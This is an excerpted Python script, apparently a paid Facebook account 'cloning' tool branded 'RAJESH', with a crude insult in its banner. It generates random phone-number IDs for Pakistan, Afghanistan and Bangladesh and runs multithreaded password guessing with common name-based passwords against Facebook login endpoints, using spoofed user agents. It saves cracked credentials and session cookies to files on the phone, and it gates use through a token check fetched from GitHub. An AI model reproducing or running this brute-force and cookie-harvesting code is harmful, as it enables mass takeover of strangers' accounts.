...
os.system('clear')
print('\n\033[1;37m Loading RAJESH Tools...')
try:
...
for agent in range(10000):
        ...
        RAJESH = random.choice(["David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]","David Client (7152 Windows, IE 9/11) [Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/7.0)]","David Client (6988 Windows, IE 9/11) [Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko]",]) 
...
logo=("""\033[1;37m $$$$$$$\   $$$$$$\     $$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ 
 \033[1;33m$$  __$$\ $$  __$$\    \__$$ |$$  _____|$$  __$$\ $$ |  $$ |
 \033[1;32m$$ |  $$ |$$ /  $$ |      $$ |$$ |      $$ /  \__|$$ |  $$ |
 \033[1;91m$$$$$$$  |$$$$$$$$ |      $$ |$$$$$\    \$$$$$$\  $$$$$$$$ |
 \033[1;94m$$  __$$< $$  __$$ |$$\   $$ |$$  __|    \____$$\ $$  __$$ |
 \033[1;92m$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$\   $$ |$$ |  $$ |
 \033[1;95m$$ |  $$ |$$ |  $$ |\$$$$$$  |$$$$$$$$\ \$$$$$$  |$$ |  $$ |
 \033[1;96m\__|  \__|\__|  \__| \______/ \________| \______/ \__|  \__|  
\x1b[1;91m ---------------------------------------------
\x1b[1;93m [\x1b[1;91m•\x1b[1;92m] \x1b[1;91m Owner   :  RAJESH
\x1b[1;95m [\x1b[1;91m•\x1b[1;91m] \x1b[1;95m Facebook:  RAJESH 
\x1b[1;94m [\x1b[1;91m•\x1b[1;96m] \x1b[1;92m Status  :  Paid
\x1b[1;92m [\x1b[1;91m•\x1b[1;91m] \x1b[1;93m Tool    :  MIX
\x1b[1;91m [\x1b[1;91m•\x1b[1;97m] \x1b[1;94m Version : \x1b[1;92m1.2
\x1b[1;98m ----------------------------------------------
\x1b[1;93m you are bypaser mar chudi😎
\033[1;37m==================================================== """  )
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     RAJESH TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  RAJESH TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/RAJESH-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/RAJESH-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   RAJESH TOOL RANDOM CLONING MENU')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/RAJESHkhano71');menu()
                        elif xd in ['4','04']:
                        	     os.system('xdg-open https://chat.whatsapp.com/HjFjl6UTo3VFbT0wI7zNFN');menu()
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM RAJESH TOOL')
                                linex()
                                input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/RAJESHkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE RAJESH TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  RAJESH TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RAJESH:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;97mCode Teaches You How To Face Big Problems ! ')
                        print('\033[1;97mYour Mind Is Your Best Weapons ! ')
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan123','khan12345','baloch123','baloch786','i love you','khankhan','baloch','khattak','khattak123','ali123','ali786','RAJESH123']
                                RAJESH.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                ...
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/RAJESH-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/RAJESH-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  RAJESH TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mRAJESH TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[RAJESH-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RAJESH=session.cookies.get_dict().keys()
                        if "c_user" in RAJESH:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[RAJESH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAJESH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/RAJESH-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAJESH:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[RAJESH-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAJESH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [RAJESH-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        head =                         head ={'authority': 'mbasic.facebook.com',
                        ...
                        if "c_user" in RAJESH:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [RAJESH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAJESH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAJESH:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RAJESH] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[RAJESH-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RAJESH_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RAJESH_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RAJESH-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RAJESH_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAJESH-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[LEGEN-RAJESH-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/RAJESH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [RAJESH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAJESH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAJESH-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RAJESH-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RAJESH-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RAJESH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RAJESH-OK] '+uid+' | '+pas+'\033[1;97m')
...
def approval():
  ...
  id = "*".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Rajesh108765/King42/main/King420.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+917863915619?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
